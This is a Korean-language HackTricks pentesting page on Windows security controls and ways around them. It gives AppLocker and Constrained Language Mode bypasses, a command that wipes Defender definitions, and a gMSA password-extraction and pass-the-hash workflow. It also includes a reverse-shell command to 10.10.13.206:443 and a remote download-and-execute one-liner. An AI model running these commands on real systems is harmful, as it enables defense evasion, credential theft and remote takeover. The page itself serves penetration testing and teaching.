# Windows 보안 제어

{{#include ../../banners/hacktricks-training.md}}

## AppLocker 정책

애플리케이션 화이트리스트는 시스템에 존재하거나 실행되는 것을 허용하는 승인된 소프트웨어 애플리케이션 또는 실행 파일의 목록입니다. 목표는 조직의 특정 비즈니스 요구에 부합하지 않는 유해한 멀웨어 및 승인되지 않은 소프트웨어로부터 환경을 보호하는 것입니다.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) 은 Microsoft의 **애플리케이션 화이트리스트 솔루션**으로 시스템 관리자가 **사용자가 실행할 수 있는 애플리케이션과 파일을 제어**할 수 있게 합니다. 이 솔루션은 실행 파일, 스크립트, Windows 설치 파일, DLL, 패키지된 앱 및 패키지 앱 설치 프로그램에 대해 **세밀한 제어**를 제공합니다.\
조직에서는 **cmd.exe 및 PowerShell.exe를 차단**하거나 특정 디렉터리에 대한 쓰기 권한을 제한하는 경우가 일반적이지만, **이러한 조치는 모두 우회될 수 있습니다**.

### 확인

어떤 파일/확장자가 블랙리스트/화이트리스트에 있는지 확인:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
이 레지스트리 경로에는 AppLocker에 의해 적용된 구성 및 정책이 포함되어 있으며, 시스템에서 적용 중인 규칙 집합을 검토할 수 있는 방법을 제공합니다:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- 유용한 **Writable folders** to bypass AppLocker Policy: AppLocker가 `C:\Windows\System32` 또는 `C:\Windows` 내부의 어떤 실행도 허용하는 경우, 이를 **bypass**하기 위해 사용할 수 있는 **writable folders**가 있습니다.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 일반적으로 **신뢰된** [**"LOLBAS's"**](https://lolbas-project.github.io/) 바이너리는 AppLocker 우회에 유용할 수 있다.
- **부실하게 작성된 규칙도 우회될 수 있다**
- 예를 들어, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, 어디에나 **`allowed`라는 폴더를** 생성하면 허용된다.
- 조직은 종종 `%System32%\WindowsPowerShell\v1.0\powershell.exe` 실행 파일 차단에 주력하지만, `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`나 `PowerShell_ISE.exe`와 같은 **다른** PowerShell 실행 파일 위치를 간과한다.
- DLL 강제 적용은 시스템에 추가 부하를 줄 수 있고, 아무것도 깨지지 않도록 보장하기 위한 테스트 양 때문에 거의 활성화되지 않는다. 따라서 **DLL을 백도어로 사용하면 AppLocker를 우회하는 데 도움이 된다**.
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하여 임의 프로세스에서 Powershell 코드를 실행하고 AppLocker를 우회할 수 있다. 자세한 내용은 다음을 확인하라: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## 자격 증명 저장소

### 보안 계정 관리자 (SAM)

로컬 자격 증명은 이 파일에 존재하며, 비밀번호는 해시되어 있다.

### 로컬 보안 권한 (LSA) - LSASS

해당 서브시스템의 **메모리**에 **자격 증명**(해시된 형태)이 **저장**되어 Single Sign-On을 위해 사용된다.\
**LSA**는 로컬 **보안 정책**(비밀번호 정책, 사용자 권한 등), **인증**, **액세스 토큰** 등을 관리한다.\
LSA는 로컬 로그인 시 제공된 자격 증명을 **SAM** 파일에서 **확인**하고 도메인 사용자를 인증하기 위해 **도메인 컨트롤러**와 **통신**한다.

자격 증명은 **LSASS** 프로세스 내부에 저장된다: Kerberos 티켓, NT 및 LM 해시, 쉽게 복호화 가능한 비밀번호.

### LSA secrets

LSA는 디스크에 몇몇 자격 증명을 저장할 수 있다:

- Active Directory 컴퓨터 계정의 비밀번호(도달할 수 없는 도메인 컨트롤러).
- Windows 서비스 계정의 비밀번호
- 예약된 작업의 비밀번호
- 그 외 (IIS 애플리케이션의 비밀번호...)

### NTDS.dit

이는 Active Directory의 데이터베이스로, Domain Controller에만 존재한다.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender)는 Windows 10과 Windows 11, 그리고 Windows Server 버전에서 제공되는 안티바이러스다. 일반적인 pentesting 도구들(예: **`WinPEAS`**)을 차단한다. 하지만 이러한 보호를 우회하는 방법들이 있다.

### 확인

Defender의 **상태**를 확인하려면 PS cmdlet **`Get-MpComputerStatus`**를 실행할 수 있다(활성화 여부는 **`RealTimeProtectionEnabled`** 값을 확인):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

열거하려면 다음을 실행할 수도 있다:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## 암호화된 파일 시스템 (EFS)

EFS는 **대칭 키**로 알려진 **File Encryption Key (FEK)**을 사용해 파일을 암호화하여 보호합니다. 이 키는 사용자의 **공개 키**로 암호화되어 암호화된 파일의 $EFS **대체 데이터 스트림**에 저장됩니다. 복호화가 필요할 때는 사용자의 디지털 인증서에 해당하는 **개인 키**로 $EFS 스트림에서 FEK를 복호화합니다. 자세한 내용은 [here](https://en.wikipedia.org/wiki/Encrypting_File_System)에서 확인하세요.

**사용자 개입 없이 발생하는 복호화 시나리오**에는 다음이 포함됩니다:

- 파일이나 폴더가 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)와 같은 EFS를 지원하지 않는 파일 시스템으로 이동되면 자동으로 복호화됩니다.
- SMB/CIFS 프로토콜을 통해 네트워크로 전송되는 암호화된 파일은 전송 전에 복호화됩니다.

이 암호화 방식은 소유자에게 암호화된 파일에 대한 **투명한 접근**을 허용합니다. 그러나 단순히 소유자의 비밀번호를 변경하고 로그인하는 것만으로는 복호화가 허용되지 않습니다.

**핵심 요약**:

- EFS는 사용자 공개 키로 암호화된 대칭 FEK를 사용합니다.
- 복호화는 FEK에 접근하기 위해 사용자의 개인 키를 사용합니다.
- FAT32로 복사하거나 네트워크 전송 시처럼 특정 조건에서 자동 복호화가 발생합니다.
- 암호화된 파일은 소유자가 추가 조치 없이 접근할 수 있습니다.

### EFS 정보 확인

이 경로가 존재하는지 확인하여 **사용자**가 이 **서비스**를 사용했는지 확인하세요: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

cipher /c \<file\>를 사용해 파일에 **누가** 접근할 수 있는지 확인할 수 있습니다. 또한 폴더 내에서 `cipher /e`와 `cipher /d`를 사용해 모든 파일을 **암호화** 및 **복호화**할 수 있습니다.

### EFS 파일 복호화

#### SYSTEM 권한 획득

이 방법은 **피해자 사용자**가 호스트 내에서 **프로세스**를 **실행 중**이어야 합니다. 그런 경우 `meterpreter` 세션을 사용하여 해당 프로세스의 토큰을 가장할 수 있습니다(`incognito`의 `impersonate_token`). 또는 단순히 피해자 사용자의 프로세스로 `migrate`할 수도 있습니다.

#### 사용자의 비밀번호를 알고 있는 경우


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## 그룹 관리 서비스 계정 (gMSA)

Microsoft는 IT 인프라에서 서비스 계정 관리를 간소화하기 위해 **Group Managed Service Accounts (gMSA)**를 개발했습니다. 종종 "**Password never expire**" 설정이 활성화된 기존 서비스 계정과 달리, gMSA는 더 안전하고 관리하기 쉬운 솔루션을 제공합니다:

- **Automatic Password Management**: gMSA는 복잡한 240자 길이의 비밀번호를 사용하며 도메인 또는 컴퓨터 정책에 따라 자동으로 변경됩니다. 이 프로세스는 Microsoft's Key Distribution Service (KDC)가 처리하므로 수동으로 비밀번호를 갱신할 필요가 없습니다.
- **Enhanced Security**: 이 계정들은 잠금에 영향을 받지 않으며 대화형 로그인(interactive logins)에 사용할 수 없어 보안이 향상됩니다.
- **Multiple Host Support**: gMSA는 여러 호스트에 걸쳐 공유될 수 있어 여러 서버에서 실행되는 서비스에 적합합니다.
- **Scheduled Task Capability**: managed service accounts와 달리 gMSA는 예약 작업(scheduled tasks)을 실행할 수 있습니다.
- **Simplified SPN Management**: 컴퓨터의 sAMaccount 세부사항이나 DNS 이름이 변경되면 시스템이 Service Principal Name (SPN)을 자동으로 업데이트하여 SPN 관리를 단순화합니다.

gMSA의 비밀번호는 LDAP 속성 _**msDS-ManagedPassword**_에 저장되며 도메인 컨트롤러(DC)가 30일마다 자동으로 재설정합니다. 이 비밀번호는 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)로 알려진 암호화된 데이터 블롭이며, 권한 있는 관리자와 gMSA가 설치된 서버에서만 검색할 수 있어 안전한 환경을 보장합니다. 이 정보를 액세스하려면 LDAPS와 같은 보안 연결이 필요하거나 연결이 'Sealing & Secure'로 인증되어야 합니다.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

이 비밀번호는 [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.

### ACL 체이닝을 악용하여 read gMSA managed password (GenericAll -> ReadGMSAPassword)

많은 환경에서, 권한이 낮은 사용자는 잘못 구성된 객체 ACLs를 악용하여 DC를 침해하지 않고 gMSA 비밀로 pivot할 수 있습니다:

- 당신이 제어할 수 있는 그룹(예: GenericAll/GenericWrite를 통해)이 gMSA에 대해 `ReadGMSAPassword` 권한을 부여받습니다.
- 해당 그룹에 자신을 추가하면 LDAP를 통해 gMSA의 `msDS-ManagedPassword` blob을 읽을 권한을 상속받아 사용 가능한 NTLM credentials를 유도할 수 있습니다.

일반적인 작업 흐름:

1) BloodHound로 경로를 찾고 foothold principals를 Owned로 표시하세요. 다음과 같은 엣지를 찾으세요:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) 제어하는 중간 그룹에 자신을 추가하세요 (bloodyAD 예시):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) LDAP을 통해 gMSA 관리 비밀번호를 읽고 NTLM 해시를 유도합니다. NetExec은 `msDS-ManagedPassword` 추출과 NTLM으로의 변환을 자동화합니다:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) NTLM hash를 사용해 gMSA로 인증합니다 (no plaintext needed). 계정이 Remote Management Users에 속해 있다면, WinRM이 직접 작동합니다:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
참고:
- LDAP에서 `msDS-ManagedPassword`를 읽으려면 봉인(sealing)이 필요합니다(예: LDAPS/sign+seal). 도구들이 이를 자동으로 처리합니다.
- gMSAs는 종종 WinRM과 같은 로컬 권한이 부여됩니다; lateral movement를 계획하려면 그룹 멤버십(예: Remote Management Users)을 검증하세요.
- NTLM을 직접 계산하려고 blob만 필요하면, MSDS-MANAGEDPASSWORD_BLOB 구조를 참조하세요.



## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), enables the management of local Administrator passwords. These passwords, which are **randomized**, unique, and **regularly changed**, are stored centrally in Active Directory. Access to these passwords is restricted through ACLs to authorized users. With sufficient permissions granted, the ability to read local admin passwords is provided.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)는 PowerShell을 효과적으로 사용하기 위해 필요한 많은 기능을 **제한**합니다. 예를 들어 COM objects 차단, 승인된 .NET types만 허용, XAML-based workflows, PowerShell classes 등입니다.

### **확인**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
현재 Windows에서는 해당 우회가 작동하지 않지만[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**컴파일하려면** **다음이 필요할 수 있습니다:** _**Add a Reference**_ -> _Browse_ -> _Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` 를 추가하고 **프로젝트를 .Net4.5로 변경하세요**.

#### 직접 우회:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS 실행 정책

기본적으로 **restricted**로 설정되어 있습니다. 이 정책을 우회하는 주요 방법:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

사용자 인증에 사용할 수 있는 API입니다.

The SSPI will be in charge of finding the adequate protocol for two machines that want to communicate. The preferred method for this is Kerberos. Then the SSPI will negotiate which authentication protocol will be used, these authentication protocols are called Security Support Provider (SSP), are located inside each Windows machine in the form of a DLL and both machines must support the same to be able to communicate.

### Main SSPs

- **Kerberos**: 선호되는 방식
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: 호환성 때문에
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: 웹 서버와 LDAP에 사용, 비밀번호가 MD5 해시 형태
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL 및 TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 사용할 프로토콜을 협상하는 데 사용됨 (Kerberos 또는 NTLM; 기본값은 Kerberos)
- %windir%\Windows\System32\lsasrv.dll

#### The negotiation could offer several methods or only one.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)는 권한 상승 작업에 대해 **동의 프롬프트**를 표시하는 기능입니다.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
